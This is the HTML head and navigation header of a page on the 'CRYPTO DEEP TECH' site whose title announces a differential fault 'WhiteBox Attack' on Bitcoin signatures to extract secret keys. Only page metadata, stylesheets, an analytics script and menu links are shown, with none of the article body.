<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="ru-RU"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">

	<!-- This site is optimized with the Yoast SEO plugin v19.9 - https://yoast.com/wordpress/plugins/seo/ -->
	<style type="text/css"></style><title>We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - «CRYPTO DEEP TECH»</title>
	<meta name="description" content="In this article, we will again touch on the topic of a signature failure in a blockchain transaction and apply a completely new attack: &quot;WhiteBox Attack on Bitcoin&quot;.Differential Fault Analysis abbreviated (DFA)">
	<link rel="canonical" href="https://cryptodeeptech.ru/whitebox-attack/">
	<meta property="og:locale" content="ru_RU">
	<meta property="og:type" content="article">
	<meta property="og:title" content="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - «CRYPTO DEEP TECH»">
	<meta property="og:description" content="In this article, we will again touch on the topic of a signature failure in a blockchain transaction and apply a completely new attack: &quot;WhiteBox Attack on Bitcoin&quot;.Differential Fault Analysis abbreviated (DFA)">
	<meta property="og:url" content="https://cryptodeeptech.ru/whitebox-attack/">
	<meta property="og:site_name" content="«CRYPTO DEEP TECH»">
	<meta property="article:published_time" content="2022-11-13T00:42:59+00:00">
	<meta property="article:modified_time" content="2022-11-13T01:08:56+00:00">
	<meta property="og:image" content="https://cryptodeep.ru/wp-content/uploads/2022/11/image-6-1024x467.png">
	<meta name="author" content="Crypto Deep Tech">
	<meta name="twitter:card" content="summary_large_image">
	<meta name="twitter:label1" content="Написано автором">
	<meta name="twitter:data1" content="Crypto Deep Tech">
	<meta name="twitter:label2" content="Примерное время для чтения">
	<meta name="twitter:data2" content="32 минуты">
	<script async="" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/tag.js"></script><script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://cryptodeeptech.ru/whitebox-attack/#article","isPartOf":{"@id":"https://cryptodeeptech.ru/whitebox-attack/"},"author":{"name":"Crypto Deep Tech","@id":"https://cryptodeeptech.ru/#/schema/person/0ef8ac0f63991970628a3a6587f9e6c0"},"headline":"We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key","datePublished":"2022-11-13T00:42:59+00:00","dateModified":"2022-11-13T01:08:56+00:00","mainEntityOfPage":{"@id":"https://cryptodeeptech.ru/whitebox-attack/"},"wordCount":2162,"publisher":{"@id":"https://cryptodeeptech.ru/#organization"},"image":{"@id":"https://cryptodeeptech.ru/whitebox-attack/#primaryimage"},"thumbnailUrl":"https://cryptodeep.ru/wp-content/uploads/2022/11/image-6-1024x467.png","articleSection":["Cryptanalysis"],"inLanguage":"ru-RU"},{"@type":"WebPage","@id":"https://cryptodeeptech.ru/whitebox-attack/","url":"https://cryptodeeptech.ru/whitebox-attack/","name":"We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - «CRYPTO DEEP TECH»","isPartOf":{"@id":"https://cryptodeeptech.ru/#website"},"primaryImageOfPage":{"@id":"https://cryptodeeptech.ru/whitebox-attack/#primaryimage"},"image":{"@id":"https://cryptodeeptech.ru/whitebox-attack/#primaryimage"},"thumbnailUrl":"https://cryptodeep.ru/wp-content/uploads/2022/11/image-6-1024x467.png","datePublished":"2022-11-13T00:42:59+00:00","dateModified":"2022-11-13T01:08:56+00:00","description":"In this article, we will again touch on the topic of a signature failure in a blockchain transaction and apply a completely new attack: \"WhiteBox Attack on Bitcoin\".Differential Fault Analysis abbreviated (DFA)","breadcrumb":{"@id":"https://cryptodeeptech.ru/whitebox-attack/#breadcrumb"},"inLanguage":"ru-RU","potentialAction":[{"@type":"ReadAction","target":["https://cryptodeeptech.ru/whitebox-attack/"]}]},{"@type":"ImageObject","inLanguage":"ru-RU","@id":"https://cryptodeeptech.ru/whitebox-attack/#primaryimage","url":"https://cryptodeep.ru/wp-content/uploads/2022/11/image-6-1024x467.png","contentUrl":"https://cryptodeep.ru/wp-content/uploads/2022/11/image-6-1024x467.png"},{"@type":"BreadcrumbList","@id":"https://cryptodeeptech.ru/whitebox-attack/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Главная страница","item":"https://cryptodeeptech.ru/"},{"@type":"ListItem","position":2,"name":"We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key"}]},{"@type":"WebSite","@id":"https://cryptodeeptech.ru/#website","url":"https://cryptodeeptech.ru/","name":"«CRYPTO DEEP TECH»","description":"Cryptanalysis and data financial security services","publisher":{"@id":"https://cryptodeeptech.ru/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://cryptodeeptech.ru/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"ru-RU"},{"@type":"Organization","@id":"https://cryptodeeptech.ru/#organization","name":"«CRYPTO DEEP TECH»","url":"https://cryptodeeptech.ru/","logo":{"@type":"ImageObject","inLanguage":"ru-RU","@id":"https://cryptodeeptech.ru/#/schema/logo/image/","url":"https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4.png","contentUrl":"https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4.png","width":1279,"height":319,"caption":"«CRYPTO DEEP TECH»"},"image":{"@id":"https://cryptodeeptech.ru/#/schema/logo/image/"}},{"@type":"Person","@id":"https://cryptodeeptech.ru/#/schema/person/0ef8ac0f63991970628a3a6587f9e6c0","name":"Crypto Deep Tech","sameAs":["https://cryptodeeptech.ru","https://www.youtube.com/channel/UCd8W6qtRSiBn0Q0wy6HuNkQ/"],"url":"https://cryptodeeptech.ru/author/cryptodeeptech/"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
<link rel="alternate" type="application/rss+xml" title="«CRYPTO DEEP TECH» » Лента" href="https://cryptodeeptech.ru/feed/">
<link rel="alternate" type="application/rss+xml" title="«CRYPTO DEEP TECH» » Лента комментариев" href="https://cryptodeeptech.ru/comments/feed/">
<link rel="stylesheet" id="itng-block-style-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_8f426a1779caff96bb3f2afbcf.css" media="all">
<link rel="stylesheet" id="wp-block-library-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/style.min.css" media="all">
<link rel="stylesheet" id="classic-theme-styles-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/classic-themes.min.css" media="all">
<style id="global-styles-inline-css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="wp-date-remover-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_e6094661d8923e95b233019ebf.css" media="all">
<link rel="stylesheet" id="itng-fonts-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/css" media="all">
<link rel="stylesheet" id="itng-style-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_8de4505c66a21eefd3c1c98b64.css" media="all">
<link rel="stylesheet" id="itng-main-style-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_d1cf6f49400112d539e59eee9b.css" media="all">
<style id="itng-main-style-inline-css">
.custom-logo-link img {width: 400px;}@media screen and (min-width: 992px) {#header-image .header-overlay {
            opacity: 0.01;
        }}
ins,
	.nav-wrapper,
	#menu,
	.main-navigation ul#menu-desktop ul,
	#itng-featured-news .slider-post-wrapper .posted-on a,
	#itng-featured-news #itng-featured-news-list-container .posted-on a,
	#itng-featured-posts .itng-featured-post-date,
	#itng-featured-news #itng-featured-news-carousel-container .posted-on a,
	#colophon,
	[class^=itng-search] form,
	#itng-featured-cat .featured-cat-thumb h2,
	#itng-featured-cat .featured-cat-thumb h3
	{background-color: #008bca}article .entry-meta a,
	article .blog-footer,
	article .blog-footer a,
	.widget a,
	.nav-links a,
	.itng-pagination .nav-links > a,
	.itng-pagination .dots
	{color: #008bca !important}blockquote,
	#itng-content-title span
	{border-color: #008bca}button.top-menu-mobile
	{background-color: #43bdf2 !important}#footer-sidebar .widget-title
	{color: #43bdf2 !important}
</style>
<link rel="stylesheet" id="bootstrap-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_d26191bd0380b0cf97525a613b.css" media="all">
<link rel="stylesheet" id="owl-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_c8322bd5bffc8e2856f2cbcd03.css" media="all">
<link rel="stylesheet" id="mag-popup-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_30b593b71d7672658f89bfea0a.css" media="all">
<link rel="stylesheet" id="font-awesome-css" href="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_c495654869785bc3df60216616.css" media="all">
<script src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/jquery.min.js" id="jquery-core-js"></script>
<script src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_49cea0a781874a962879c2caca9.js" id="wp-date-remover-js"></script>
<link rel="https://api.w.org/" href="https://cryptodeeptech.ru/wp-json/"><link rel="alternate" type="application/json" href="https://cryptodeeptech.ru/wp-json/wp/v2/posts/1175"><meta name="generator" content="WordPress 6.1">
<link rel="alternate" type="application/json+oembed" href="https://cryptodeeptech.ru/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcryptodeeptech.ru%2Fwhitebox-attack%2F">
<link rel="alternate" type="text/xml+oembed" href="https://cryptodeeptech.ru/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcryptodeeptech.ru%2Fwhitebox-attack%2F&amp;format=xml">
<!-- Analytics by WP Statistics v13.2.7 - https://wp-statistics.com/ -->
<script>var WP_Statistics_http = new XMLHttpRequest();WP_Statistics_http.open('GET', 'https://cryptodeeptech.ru/wp-json/wp-statistics/v2/hit?_=1668301793&_wpnonce=6d269186a8&wp_statistics_hit_rest=yes&referred=https%3A%2F%2Fcryptodeeptech.ru&exclusion_match=no&exclusion_reason&track_all=1&current_page_type=post&current_page_id=1175&search_query&page_uri=/whitebox-attack/', true);WP_Statistics_http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");WP_Statistics_http.send(null);</script>
		<style type="text/css">
						#header-image {
						background-image: url(https://cryptodeeptech.ru/wp-content/uploads/2022/07/header3.jpg);
						background-size: cover;
						background-repeat: repeat;
						background-position: center center;
				}
							.site-title, .site-description {
				display: none;
				position: absolute;
				clip: rect(1px, 1px, 1px, 1px);
				}
					</style>
		<style id="custom-background-css">
body.custom-background { background-color: #eff3fd; }
</style>
	<link rel="icon" href="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-32x32.png" sizes="32x32">
<link rel="icon" href="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-180x180.png">
<meta name="msapplication-TileImage" content="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-270x270.png">
</head>

<body data-rsssl="1" class="post-template-default single single-post postid-1175 single-format-standard custom-background wp-custom-logo no-sidebar">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 0.49803921568627"></fefuncr><fefuncg type="table" tableValues="0 0.49803921568627"></fefuncg><fefuncb type="table" tableValues="0 0.49803921568627"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 1"></fefuncr><fefuncg type="table" tableValues="0 1"></fefuncg><fefuncb type="table" tableValues="0 1"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.54901960784314 0.98823529411765"></fefuncr><fefuncg type="table" tableValues="0 1"></fefuncg><fefuncb type="table" tableValues="0.71764705882353 0.25490196078431"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 1"></fefuncr><fefuncg type="table" tableValues="0 0.27843137254902"></fefuncg><fefuncb type="table" tableValues="0.5921568627451 0.27843137254902"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 0"></fefuncr><fefuncg type="table" tableValues="0 0.64705882352941"></fefuncg><fefuncb type="table" tableValues="0 1"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.78039215686275 1"></fefuncr><fefuncg type="table" tableValues="0 0.94901960784314"></fefuncg><fefuncb type="table" tableValues="0.35294117647059 0.47058823529412"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.65098039215686 0.40392156862745"></fefuncr><fefuncg type="table" tableValues="0 1"></fefuncg><fefuncb type="table" tableValues="0.44705882352941 0.4"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-orange"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.098039215686275 1"></fefuncr><fefuncg type="table" tableValues="0 0.66274509803922"></fefuncg><fefuncb type="table" tableValues="0.84705882352941 0.41960784313725"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><div id="page" class="site">
	<a class="skip-link screen-reader-text" href="https://cryptodeeptech.ru/whitebox-attack/#primary">Skip to content</a>

	
	    <header id="masthead" class="site-header style-1">

		    
	        <div id="header-image">
		        <div class="site-branding">
					<a href="https://cryptodeeptech.ru/" class="custom-logo-link" rel="home"><img width="1279" height="319" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/cropped-header4.png" class="custom-logo" alt="«CRYPTO DEEP TECH»" decoding="async" srcset="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4.png 1279w, https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4-300x75.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4-1024x255.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4-768x192.png 768w" sizes="(max-width: 1279px) 100vw, 1279px" title="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key"></a>	<h2 class="site-title"><a href="https://cryptodeeptech.ru/" rel="home">«CRYPTO DEEP TECH»</a></h2>
		<p class="site-description">Cryptanalysis and data financial security services</p>
	        	</div>
				<div class="header-overlay"></div>
	        </div>

			<div class="nav-wrapper">
				 <div class="container">
					 <div class="d-flex">

						<div id="site-navigation" class="main-navigation col-lg-11" role="navigation">
							<ul id="menu-desktop" class="menu"><li id="menu-item-229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-229"><a href="https://cryptodeeptech.ru/">HOME</a></li>
<li id="menu-item-225" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-225"><a href="https://cryptodeeptech.ru/publication/">PUBLICATIONS</a></li>
<li id="menu-item-226" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-226"><a href="https://cryptodeeptech.ru/study/">STUDY</a></li>
